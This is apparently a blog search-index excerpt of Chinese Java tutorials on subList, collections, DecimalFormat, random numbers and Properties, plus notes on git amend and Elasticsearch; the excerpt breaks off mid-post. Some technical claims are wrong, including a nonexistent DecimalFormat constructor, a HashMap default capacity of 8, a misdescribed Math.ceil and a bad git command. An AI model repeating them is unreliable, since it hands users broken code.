一灰灰blog尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号: 一灰灰blog","link":"/hexblog/2021/08/16/210816-实战小技巧6：枚举的特殊用法/"},{"title":"210819-实战小技巧9：List.subList使用不当StackOverflowError","text":"实战小技巧：List.subList使用不当StackOverflowError 相信每个小伙伴都使用过List.subList来获取子列表，日常使用可能没啥问题，但是，请注意，它的使用，很可能一不小心就可能导致oom 1. subList场景复现，如基于list实现一个小顶堆 123456789101112131415161718public List&lt;Integer&gt; minStack(List&lt;Integer&gt; list, int value, int stackSzie) { list.add(value); if (list.size() &lt; stackSzie) { return list; } list.sort(null); return list.subList(0, stackSzie);}@Testpublic void testFix() { List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for (int i = Integer.MAX_VALUE; i &gt; Integer.MIN_VALUE; i--) { list.add(i); list = minStack(list, i, 5); System.out.println(list); }} 上面这个执行完毕之后，居然出现栈溢出 1234567// ....[2147462802, 2147462803, 2147462804, 2147462805, 2147462806][2147462801, 2147462802, 2147462803, 2147462804, 2147462805]java.lang.StackOverflowError at java.util.ArrayList$SubList.add(ArrayList.java:1057) at java.util.ArrayList$SubList.add(ArrayList.java:1057) 从实现来看，感觉也没啥问题啊， 我们稍微改一下上面的返回 12345678public List&lt;Integer&gt; minStack(List&lt;Integer&gt; list, int value, int stackSzie) { list.add(value); if (list.size() &lt; stackSzie) { return list; } list.sort(null); return new ArrayList&lt;&gt;(list.subList(0, stackSzie));} 再次执行，却没有异常；所以关键点就在与 list.subList的使用上 2. StackOverflowError分析接下来我们主要看一下list.subList的实现 123456789101112131415161718192021public List&lt;E&gt; subList(int fromIndex, int toIndex) { subListRangeCheck(fromIndex, toIndex, size); return new SubList(this, 0, fromIndex, toIndex);}private class SubList extends AbstractList&lt;E&gt; implements RandomAccess { private final AbstractList&lt;E&gt; parent; private final int parentOffset; private final int offset; int size; SubList(AbstractList&lt;E&gt; parent, int offset, int fromIndex, int toIndex) { this.parent = parent; this.parentOffset = fromIndex; this.offset = offset + fromIndex; this.size = toIndex - fromIndex; this.modCount = ArrayList.this.modCount; } ...} 上面返回的子列表是ArrayList的一个内部类SubList，它拥有一个指向父列表的成员parrent 也就是说，从源头的ArryList开始，后面每次调用subList，这个指代关系就深一层 然后它的add方法也很有意思 1234567public void add(int index, E e) { rangeCheckForAdd(index); checkForComodification(); parent.add(parentOffset + index, e); this.modCount = parent.modCount; this.size++;} 重点看 parent.add(parentOffset + index, e);，添加的数据实际上是加在最源头的ArrayList上的，也就是说，虽然你现在拿到的SubList，只有几个元素，但是它对应的数组，可能超乎你的想象 当然上面这个异常主要是以为调用栈溢出（一直往上找parent） 这里反应的另外一个重要问题则是内存泄漏，就不继续说了 如果需要解决上面这个问题，改造方法如下 1234public List&lt;E&gt; subList(int fromIndex, int toIndex) { subListRangeCheck(fromIndex, toIndex, size); return new ArrayList&lt;&gt;(new SubList(this, 0, fromIndex, toIndex));}s 3. 小结jdk提供的原生方法虽然非常好用，但是在使用的时候，也需要多家注意，一不小心就可能掉进坑里；这也告诉我们多看源码是有必要的 最后一句关键知识点小结： ArrayList.subList 返回的是内部类，与原ArrayList公用一个数组，只是限定了这个数组的起始下标和结束下标而已 在使用subList，请注意是否会存在内存泄露和栈溢出的问题 系列博文 实战小技巧1：字符串占位替换-JDK版 实战小技巧2：数组与list互转 实战小技巧 3：字符串与容器互转 实战小技巧4：优雅的实现字符串拼接 实战小技巧5：驼峰与下划线互转 实战小技巧6：枚举的特殊用法 实战小技巧7：排序比较需慎重 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/08/19/210819-实战小技巧9：List-subList使用不当StackOverflowError/"},{"title":"210820-实战小技巧10：不可变容器","text":"每天一个小技巧：不可变容器 不可变容器，看着好像在实际的业务中不怎么会用到，但实则不然，相信每个小伙伴都用过，或者看到过下面的代码 12Collections.emptyList();Collections.emptyMap(); 今天我们来介绍一下如何使用不可变容器，以及使用时的注意事项 1. JDK不可变容器java原生提供了一些不可变容器，它们最大的特点就是不支持添加、删除、修改容器内的值 Collections.emptyXxx空容器 123Collections.emptyMap();Collections.emptyList();Collections.emptySet(); 上面三个是最常用的几个了，通常当我们一个方法的返回结果定义为容器类型时，可能为了避免npe，在返回空容器时，会如此使用 除了上面这几个空的不可变容器之外，还有 UnmodifiableList UnmodifiableMap UnmodifiableSet 它们的使用姿势，通常是借助Collections来实现 1List&lt;Integer&gt; list = Collections.unmodifiableList(Arrays.asList(1, 2, 3)); 如上面创建的List，就不支持set/remove等修改操作 使用不可变容容器，最大的好处就是基于它的不可修改特性，来实现公用，且不会被污染 所以一个自然而然能想到的应用场景就是 全局共享的配置 2. Guava不可变容器上面是jdk提供的不可变容器，相比较与它们，在实际的项目中，使用Gauva的不可变容器的可能更多 ImmutableXxx；不可变容器 123List&lt;Integer&gt; list = ImmutableList.of(1, 2, 3);Set&lt;Integer&gt; set = ImmutableSet.of(1, 2, 3);Map&lt;String, Integer&gt; map = ImmutableMap.of(\"hello\", 1, \"world\", 2); 上面是最常见的三个容器对应的不可变型 从使用角度来看，初始化非常方便（相比较与jdk版而言） 3. 注意事项不可变容器虽好，但是使用不当也是很坑的；就我个人的一个观点 如果是应用内的接口方法，容器传参，返回容器时，尽量不要使用不可变容器；因为你没办法保证别人拿到你的返回容器之后，会对它进行什么操作 如果是对外提供返回结果，特别是null的场景，使用不可变的空容器优于返回null 不可变容器，用于全局公用资源，共享配置参数；多线程的数据传递时，属于比较合适的场景 系列博文 实战小技巧1：字符串占位替换-JDK版 实战小技巧2：数组与list互转 实战小技巧3：字符串与容器互转 实战小技巧4：优雅的实现字符串拼接 实战小技巧5：驼峰与下划线互转 实战小技巧6：枚举的特殊用法 实战小技巧7：排序比较需慎重 实战小技巧8：容器的初始化大小指定 实战小技巧9：List.subList使用不当StackOverflowError II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/08/20/210820-实战小技巧10：不可变容器/"},{"title":"210818-实战小技巧8：容器的初始化大小指定","text":"每天一个实战小技巧：容器的初始化大小指定 容器可以说是我们日常开发中，除了基本对象之外，使用最多的类了，那么平时在使用的时候，是否有主意到良好编程习惯的大佬，在创建容器的时候，一般会设置size；那么他们为什么要这么干呢？是出于什么进行考量的呢？ 今天我们将针对最常见的List/Map/Set三种容器类型的初始化值选择，进行说明 1. List列表，在我们日常使用过程中，会接触到下面几个 ArrayList: 最常见的数组列表 LinkedList: 基于链表的列表 CopyOnWriteArrayList: 线程安全的数组列表 接下来逐一进行说明 1.1 ArrayList现在以ArrayList为例，进行源码分析，当我们不指定列表大小，直接创建时 123public ArrayList() { this.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;} 上面是内部实现，其中elementData就是列表中存数据的数组，初始化为默认数组 当我们第一次添加一个元素时，发现数组为默认值，会触发一次数组扩容，新的数组大小为10 （详情看源码） 其次就是数组的库容机制，通过源码/网上分享知识点可以知道，这个扩容的实现如下 当新添加的元素，数组放不下时，实现扩容 扩容后的大小 = 扩容前大小 + max(添加元素个数, 1/2 * 扩容前大小) 基于上面的知识点，大致可以得出指定列表长度的好处 节省空间（用多少申请多少，避免浪费） 减少扩容带来的拷贝（扩容一次就会带来一次数组拷贝，如果已知列表很大，结果还使用默认的10，这会产生很多可避免的扩容开销） 1.2 LinkedList基于链表的列表，不同于上面的数组列表，它没有提供指定大小的构造方法，why? 因为链表本身的数据结构的特点，它就像糖葫芦一样，一个串一个，有数据，才有接上的可能，因此不需要指定大小 1.3 CopyOnWriteArrayList这个又非常有意思，它同样不能指定大小，但是原因与前面不同，主要在于它保证线程安全的实现方式 每次新增/修改(加锁，保证单线程访问)，都是在拷贝的数组操作；完成之后，用新的替换旧的 所以说，每次变更，都会存在数组拷贝，因此就没有必要提前指定数组大小 那么它的初始化每次都使用默认的么? 并不是这样的，当我们已知这个列表中的值时，推荐使用下面这种方式 12List&lt;String&gt; values= Arrays.asList(\"12\", \"220\", \"123\");List&lt;String&gt; cList = new CopyOnWriteArrayList&lt;&gt;(values); 将初始化值，放在一个普通的列表中，然后利用普通列表来初始化CopyOnWriteArrayList 2.Map常见的map容器使用，大多是下面几个 HashMap LinkedHashMap: 有序的hashmap TreeMap: 有序的hashmap ConcurrentHashMap: 线程安全的map 2.1 HashMapHashMap的底层数据结构是 数组 + 链表/红黑树，关于这个就不细说了 我们在初始化时，若不指定size，则数组的默认长度为8（请注意，Map的数组长度是2的倍数） 与ArrayList的扩容时机不一样的是，默认情况下，Map容量没满就会触发一次扩容 默认是数量达到 size * 0.75(0.75为扩容因子，可以在创建时修改)，就会触发一次扩容 why? 主要是为了减少hash冲突 同样的为了减少冲突，在初始化时，我们需要指定一个合适大小 比如我们 已知map的数量为2，这个时候Map的大小选择因该是4 map数量为6，这个时候Map的大小选择是16 有时候让我们自己来计算这个值，就有些麻烦了，这个时候，可以直接使用Guava的工具类来完成这个目的 1Map&lt;String, String&gt; map = Maps.newHashMapWithExpectedSize(6); 2.2 LinkedHashMap初始化方式同上，略 2.3 ConcurrentHashMap初始化方式同上，略 2.4 TreeMap不同于上面几个的是treeMap，没有提供指定容器大小的构造方法 原因和前面说到的LinkedList有些类似，TreeMap的底层数据结构为Tree，所以新增数据是挂在树的一个节点下面，无需指定容量大小 3. Set集合用的最多应该就是HashSet了，底层结构模型复用，所以初始化大小指定与HashMap一致，也不需要多说 4. 小结今天这篇博文主要介绍的是三种常见的容器，在创建时，如何指定容量大小 首先明确一点，指定容量大小是为了 减少扩容带来的额外开销 指定容量代销，可以减少无效的内存开销 初始化值设置的关键点: ArrayList: 数据有多少个，初始化值就是多少 HashMap: 考虑到扩容因子，初始化大小 = (size / 0.75 + 1) 5. 系列博文 实战小技巧1：字符串占位替换-JDK版 实战小技巧2：数组与list互转 实战小技巧 3：字符串与容器互转 实战小技巧4：优雅的实现字符串拼接 实战小技巧5：驼峰与下划线互转 实战小技巧6：枚举的特殊用法 实战小技巧7：排序比较需慎重 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/08/18/210818-实战小技巧8：容器的初始化大小指定/"},{"title":"210821-实战小技巧11：数组拷贝","text":"每天一个实战小技巧，数组拷贝 说实话，在实际的业务开发中，基本上很少很少很少…会遇到数组拷贝的场景，甚至是我们一般都不怎么用数组，List它不香嘛，为啥要用数组 现在问题来了，要实现数组拷贝，怎么整？ 1. 基础写法最简单直接的写法，那就是新建一个数组，一个一个拷贝进去，不就完事了么 12345String[] data = new String[]{\"1\", \"2\", \"3\"};String[] ans = new String[data.length];for (int index = 0; index &lt; data.length; index ++) { ans[index] = data[index];} 2. 借用容器中转数组用起来有点麻烦，还是用容器舒爽，借助List来实现数组的拷贝，也就几行代码 1234String[] data = new String[]{\"1\", \"2\", \"3\"};List&lt;String&gt; list = Arrays.asList(data);String[] out = new String[data.length];list.toArray(out); 3. Array.copy上面这个有点绕得远了， 直接使用Array.copy 12String[] data = new String[]{\"1\", \"2\", \"3\"};String[] out = Arrays.copyOf(data, data.length); 4. System.arraycopy除了上面的，还可以使用更基础的用法 123String[] data = new String[]{\"1\", \"2\", \"3\"};String[] out = new String[data.length];System.arraycopy(data, 0, out, 0, data.length); 如果有看过jdk源码的小伙伴，上面这个用法应该不会陌生，特别是在容器类，这种数组拷贝的方式比比可见 参数说明: 123public static native void arraycopy(Object src, int srcPos, Object dest, int destPos, int length); src : 原数组 srcPos: 原数组用于拷贝的起始下标 dest: 拷贝后的数组 destPos: 目标数组的小标 length: 原数组中拷贝过去的数组长度 从上面的描述也能看出来，这个方法不仅能实现数组拷贝，还可以实现数组内指定片段的拷贝 系列博文： 实战小技巧1：字符串占位替换-JDK版 实战小技巧2：数组与list互转 实战小技巧3：字符串与容器互转 实战小技巧4：优雅的实现字符串拼接 实战小技巧5：驼峰与下划线互转 实战小技巧6：枚举的特殊用法 实战小技巧7：排序比较需慎重 实战小技巧8：容器的初始化大小指定 实战小技巧9：List.subList使用不当StackOverflowError 实战小技巧10：不可变容器 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/08/21/210821-实战小技巧11-数组拷贝/"},{"title":"210830-实战小技巧14：配置文件Properties","text":"每天一个实战小技巧，Properties配置文件 properties配置文件，相信各位小伙伴都不会太陌生，常用Spring的可能会经常看到它，虽说现在更推荐的是使用Yaml配置文件，但是properties配置文件的使用频率也不低 在jdk中有一个直接关连的类Properties，接下来我们来看一下它的用法 1. 配置文件properties文件的格式比较简单 key = value: 等号左边的为配置key，右边的为配置value（value值会去除前后的空格） #：以#来区分注释 一个基础的配置文件如下 12345# 测试key = valueuser.name = 一灰灰bloguser.age = 18user.skill = java,python,js,shell 2. 配置文件加载对于Properties配置文件，我们可以非常简单的借助Properties类，来实现配置的加载 123456789101112131415public class PropertiesUtil { /** * 从文件中读取配置 * * @param propertyFile * @return * @throws IOException */ public static Properties loadProperties(String propertyFile) throws IOException { Properties config = new Properties(); config.load(PropertiesUtil.class.getClassLoader().getResourceAsStream(propertyFile)); return config; }} 直接使用Properties#config就可以读取配置文件内容，并赋值到java对象 重点注意： 重点看一下Properties类的继承关系，它的父类是Hashtable, 也就是说它的本质是Map对象 123publicclass Properties extends Hashtable&lt;Object,Object&gt; {} 3. Properties对象使用因为Properties是继承自Hashtable，而Hashtable是线程安全的Map容器，因此Properties也是线程安全的，同样的，在多线程并发获取配置的时候，它的性能表现也就不咋地了，why? 首先看一下配置获取 123456789101112// 获取配置属性public String getProperty(String key) { Object oval = super.get(key); String sval = (oval instanceof String) ? (String)oval : null; return ((sval == null) &amp;&amp; (defaults != null)) ? defaults.getProperty(key) : sval;}// 获取配置属性，如果不存在，则返回默认值public String getProperty(String key, String defaultValue) { String val = getProperty(key); return (val == null) ? defaultValue : val;} 上面两个方法的使用频率很高，从签名上也很容易知道使用姿势；接下来需要看一下的为啥说并发效率很低 关键点就在第一个方法的super.get()，它对应的源码正是 123public synchronized V get(Object key) { // ...} 方法签名上有synchronized，所以为啥说并发环境下的性能表现不会特别好也就知道原因了 除了获取配置之外，另外一个常用的就是更新配置 123public synchronized Object setProperty(String key, String value) { return put(key, value);} 4. 小结本文介绍的知识点主要是properties配置文件的处理，使用同名的java类来操作；需要重点注意的是Properties类属于Hashtable的子类，同样属于容器的范畴 最后提一个扩展的问题，在SpringBoot的配置自动装载中，可以将配置内容自动装载到配置类中，简单来讲就是支持配置到java bean的映射，如果现在让我们来实现这个，可以怎么整？ 系列博文： 实战小技巧1：字符串占位替换-JDK版 实战小技巧2：数组与list互转 实战小技巧3：字符串与容器互转 实战小技巧4：优雅的实现字符串拼接 实战小技巧5：驼峰与下划线互转 实战小技巧6：枚举的特殊用法 实战小技巧7：排序比较需慎重 实战小技巧8：容器的初始化大小指定 实战小技巧9：List.subList使用不当StackOverflowError 实战小技巧10：不可变容器 实战小技巧11：数组拷贝 实战小技巧12：数字格式化 实战小技巧13：进制转换很简单 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/08/30/210830-实战小技巧14：配置文件Properties/"},{"title":"210903-实战小技巧17：随机数生成怎么选","text":"每天一个实战小技巧，随机数生成怎么选 随机数生成，java中有一个专门的Random类来实现，除此之外，使用Math.random的也比较多，接下来我们简单学习下，随机数的使用姿势 1. Math.randomjdk提供的基础工具类Math中封装一些常用的基础方法，比如我们今天的主题，生成随机数，使用姿势如下 1double val = Math.random(); 使用起来比较简单，生成的是[0,1)之间的浮点数，但是不要以为它就真的只能生成0-1之间的随机数，举例如下 如果想利用它，生成一个 [120, 500] 这个区间的随机数，怎么整？ 1int ans = Double.valueOf(Math.ceil(Math.random() * 381 + 120)).intValue(); 为啥上面的可行？ 将上面的代码翻译一下，取值区间如 Math.random() * 381 + 120 取值范围如下 [0, 1) * 381 + 120 [0, 381) + 120 [120, 501) 借助Math.ceil只取浮点数中的整数部分，这样我们的取值范围就是 [120, 500]了，和我们的预期一致 最后简单来看下，Math.random()是怎么实现随机数的 1234567private static final class RandomNumberGeneratorHolder { static final Random randomNumberGenerator = new Random();}public static double random() { return RandomNumberGeneratorHolder.randomNumberGenerator.nextDouble();} 请注意上面的实现，原来底层依然使用的是Random类来生成随机数，而且上面这种写法属于非常经典的单例模式写法（不同于我们常见的双重判定方式，这种属于内部类的玩法，后面再说为啥可以这么用） 2. Random除了使用上面的Math.random来获取随机数之外，直接使用Random类也是很常见的case；接下来先简单看一下Random的使用姿势 创建Random对象 1234// 以当前时间戳作为随机种子Random random = new Random();// 以固定的数字作为随机种子，好处是每次执行时生成的随机数是一致的，便于场景复现Random random2 = new Random(10); 生成随机数 123456789101112// [0, max) 之间的随机整数random.nextInt(max);// 随机返回ture/falserandom.nextBoolean()// 随机长整数random.nextLong()// 随机浮点数random.nextFloat()random.nextDouble() 伪随机高斯分布双精度数 1random.nextGaussian() 随机类的nextGaussian()方法返回下一个伪随机数，即与随机数生成器序列的平均值为0.0，标准差为1.0的高斯(正态)分布双精度值 这种使用场景可能用在更专业的场景，至少我接触过的业务开发中，没有用过这个😂 3. Math.random 与 Random如何选上面两个都可以用来生成随机数，那么在实际使用的时候，怎么选择呢？ 从前面的描述也可以知道，它们两没啥本质区别，底层都是用的Random类，在实际的运用过程中，如果我们希望可以场景复现，比如测试中奖概率的场景下，选择Random类，指定随机种子可能更友好；如果只是简单的随机数生成使用，那么选择Math.random即可，至少使用起来一行代码即可 系列博文： 实战小技巧1：字符串占位替换-JDK版 实战小技巧2：数组与list互转 实战小技巧3：字符串与容器互转 实战小技巧4：优雅的实现字符串拼接 实战小技巧5：驼峰与下划线互转 实战小技巧6：枚举的特殊用法 实战小技巧7：排序比较需慎重 实战小技巧8：容器的初始化大小指定 实战小技巧9：List.subList使用不当StackOverflowError 实战小技巧10：不可变容器 实战小技巧11：数组拷贝 实战小技巧12：数字格式化 实战小技巧13：进制转换很简单 实战小技巧14：配置文件Properties II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/09/03/210903-实战小技巧17：随机数生成怎么选/"},{"title":"210825-实战小技巧12：数字格式化","text":"每天一个实战小技巧，数字格式化 数字的格式化场景，更多的是在日志输出、金额计算相关的领域中会用到，平常我们可能更多使用String.format来格式化，但是请注意，数字格式化是有一个DecimalFormat，专门来针对数字进行格式化 今天我们的知识点就是DecimalFormat来实现数字格式化 1. DecimalFormat使用说明对于DecimalFormat的使用比较简单，主要是借助两个占位0与#，区别在于当格式化的占位数，多余实际数的时候，占位0的场景下，会用前缀0来补齐；而#则不需要补齐 上面这个可能不太好理解，举例说明如下 123double num = 3.1415926;System.out.println(new DecimalFormat(\"000\", num));System.out.println(new DecimalFormat(\"###\", num)); 上面两个都是只输出整数，但是输出结果不同，如下 120033 简单来说，就是0，主要用于定长的输出，对于不足的，前缀补0 整数#小数 除了上面的基本姿势之外，更常见的是设置整数、小数的位数 12System.out.println(new DecimalFormat(\"000.00\", num));System.out.println(new DecimalFormat(\"###.##\", num)); 输出结果如下 12003.143.14 百分比 百分比的输出也属于常见的case，使用DecimalFormat就很简单 12System.out.println(new DecimalFormat(\"000.00%\", num));System.out.println(new DecimalFormat(\"###.##%\", num)); 输出如下 123314.16%314.16%` 科学计数 非专业场景下，科学技术的可能性比较小 12System.out.println(new DecimalFormat(\"000.00E0\", num));System.out.println(new DecimalFormat(\"###.##E0\", num)); 输出结果如下 12314.16E-23.1416E0 金钱样式输出 金融相关的钱输出时，非常有意思的是每三位加一个逗号分隔，如果想实现这个效果，也可以很简单完成 12double num = 31415926System.out.println(new DecimalFormat(\",###\", num)); 输出结果如下 131,415,926 嵌入模板输出 格式化模板，除了基础的000, ###之外，还可以直接放在一个字符串中，实现类似String.format的效果 比如显示余额 12double num = 31415926System.out.println(new DecimalFormat(\"您的余额,###￥\", num)); 输出结果如下 1您的余额31,415,926￥ 系列博文： 实战小技巧1：字符串占位替换-JDK版 实战小技巧2：数组与list互转 实战小技巧3：字符串与容器互转 实战小技巧4：优雅的实现字符串拼接 实战小技巧5：驼峰与下划线互转 实战小技巧6：枚举的特殊用法 实战小技巧7：排序比较需慎重 实战小技巧8：容器的初始化大小指定 实战小技巧9：List.subList使用不当StackOverflowError 实战小技巧10：不可变容器 实战小技巧11：数组拷贝 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/08/25/210825-实战小技巧12-数字格式化/"},{"title":"211009-git ammend知识点","text":"在实际使用git的过程中，难免会存在手误的场景，比如 git commit之后，发现提交的描述信息不太合适，想调整一下；或者发现本地有多个零碎未提交的commit，想合并成一个提交… 当我们出现这些需求场景的时候，可以考虑使用git commit --amend来实现 1. 修改提交文案 比如上面截图中，如果我希望修改上一次的提交内容，可以如下操作 1git commit --amend 注意上面这个只能修改最后一次提交，如果我现在想修改的不是最后一次，则可以如下操作 123git rebase -i origin/mastergit commit --amendgit rebase --continue 2. 修改提交Name/Email通常使用git commit --amend来修改提交文案的场景更多，但是某些场景下可能需要修改Author信息，比如不小心在自己的github项目中使用了公司的邮箱，这个时候如果我们需要修改，同样可以使用上面这个命令来做 1git commit --amend --author='一灰灰 &lt;yihuihuiyi@gmail.com' 同样当我们需要修改非最近一次提交的用户信息时，操作姿势和上面差不多 123git rebase -i origin/mastergit commit --amend --author='一灰灰 &lt;yihuihuiyi@gmail.com'git commit --continue 3. 多个commit合并这个的思路主要是先回退到最开始的提交，然后借助git commit --amend来合并为一个提交 123git reset --soft 5c02534b24d393f9f7a4114758e4363a128b532bgit commit --amendgit log II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/10/09/211009-git-ammend知识点/"},{"title":"210901-实战小技巧15：如何判断类为基础类型or基础类型的包装类","text":"每天一个实战小技巧，判断类为基础类型or基础类型的包装类 判断一个类是否为基础类型属于常规操作了，一般我们遇到这种case，要怎么处理呢？ 一个一个的if/else判断? 还是其他的操作姿势？ 1. 基础类型判断基础类型可以借助class类的isPrimitive方法来实现判定，使用姿势也简单 1obj.getClass().isPrimitive() 如果返回true，那么这个对象就是基本类型 boolean char byte short int long float double void 但是请注意，对于封装类型，比如Long，访问isPrimitive返回的是false 2. 封装类型判断那么封装类型可以怎么判断呢？难道一个一个的判定不成？ 首先我们注意到Class#isPrimitive的方法签名，如下 12345678910111213/** * @see java.lang.Boolean#TYPE * @see java.lang.Character#TYPE * @see java.lang.Byte#TYPE * @see java.lang.Short#TYPE * @see java.lang.Integer#TYPE * @see java.lang.Long#TYPE * @see java.lang.Float#TYPE * @see java.lang.Double#TYPE * @see java.lang.Void#TYPE * @since JDK1.1 */public native boolean isPrimitive(); 上面的注释中，提到了Boolean#Type之类的静态成员，也就是说包装类型，都有一个TYPE的静态成员 比如boolean的是这个 12@SuppressWarnings(\"unchecked\")public static final Class&lt;Boolean&gt; TYPE = (Class&lt;Boolean&gt;) Class.getPrimitiveClass(\"boolean\"); 所以我们可以通过这个TYPE来判定，当前对象是否为封装对象 12345try { return ((Class) clz.getField(\"TYPE\").get(null)).isPrimitive();} catch (Exception e) { return false;} 如果Class对象没有TYPE字段，那么就不是封装类，直接抛异常，返回false；当然这种通过异常的方式来判定，并不优雅；但是写法上比我们一个一个的if/else进行对比，要好得多了 系列博文： 实战小技巧1：字符串占位替换-JDK版 实战小技巧2：数组与list互转 实战小技巧3：字符串与容器互转 实战小技巧4：优雅的实现字符串拼接 实战小技巧5：驼峰与下划线互转 实战小技巧6：枚举的特殊用法 实战小技巧7：排序比较需慎重 实战小技巧8：容器的初始化大小指定 实战小技巧9：List.subList使用不当StackOverflowError 实战小技巧10：不可变容器 实战小技巧11：数组拷贝 实战小技巧12：数字格式化 实战小技巧13：进制转换很简单 实战小技巧14：配置文件Properties II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2021/09/03/210901-实战小技巧15：如何判断类为基础类型or基础类型的包装类/"},{"title":"211018-ElasticSearch全文搜索支持配置","text":"在es的使用过程中，全文搜索属于一个常见的场景，特别是当我们将es作为日志存储检索来使用时，根据关键字查询对应的日志信息，可以怎么处理呢? 1. 动态模板结合copy_to方式在创建索引的时候，我们新增一个allColumnValue的字段，将所有其他的column值都拷贝过去，然后针对这个字段进行检索，即可以实现全文的搜索方式了 这里借助dynamic_templtes来实现上面的自动拷贝逻辑，因此我们可以如下创建一个索引 12345678910111213141516171819202122PUT search_all_demo { \"mappings\": { \"dynamic_templates\" : [ { \"copy_to_allcolumnvalue\" : { \"match_mapping_type\" : \"*\", \"mapping\" : { \"copy_to\" : \"allColumnValue\", \"ignore_above\" : 512, \"type\" : \"keyword\" } } } ], \"properties\": { \"allColumnValue\" : { \"type\" : \"text\" } } }} 创建上面的映射表时，两个点 allColumnValue：字段 dynamic_templates: 实现字段拷贝 接下来写入一个数据进行测试 1234567POST search_all_demo/_doc{ \"name\": \"一灰灰\", \"site\": \"www.hhui.top\", \"title\": \"java developer\"} 然后检索一下是否可以查询到希望的结果 12345678GET search_all_demo/_search{ \"query\": { \"match\": { \"allColumnValue\": \"灰灰\" } }} 上面这个查询之后，正常会命中我们的数据，并返回 123456789101112131415161718192021222324252627282930{ \"took\" : 1, \"timed_out\" : false, \"_shards\" : { \"total\" : 1, \"successful\" : 1, \"skipped\" : 0, \"failed\" : 0 }, \"hits\" : { \"total\" : { \"value\" : 1, \"relation\" : \"eq\" }, \"max_score\" : 0.7911257, \"hits\" : [ { \"_index\" : \"search_all_demo\", \"_type\" : \"_doc\", \"_id\" : \"1FoBk3wB-kdeh8MF_IbL\", \"_score\" : 0.7911257, \"_source\" : { \"name\" : \"一灰灰\", \"site\" : \"www.hhui.top\", \"title\" : \"java developer\" } } ] }} 注意 使用上面这种配置时，对于Field有要求，当我们制定一个Map类型时，会失败 123456789POST search_all_demo/_doc{ \"name\": \"一灰\", \"site\": \"blog.hhui.top\", \"ddd\": { \"user\": \"yihui\", \"pwd\": \"yihui\" }} 上面的ddd会提示异常 1234567891011121314151617{ \"error\" : { \"root_cause\" : [ { \"type\" : \"mapper_parsing_exception\", \"reason\" : \"failed to parse field [ddd] of type [keyword] in document with id '11qek3wB-kdeh8MFm4bN'. Preview of field's value: '{pwd=yihui, user=yihui}'\" } ], \"type\" : \"mapper_parsing_exception\", \"reason\" : \"failed to parse field [ddd] of type [keyword] in document with id 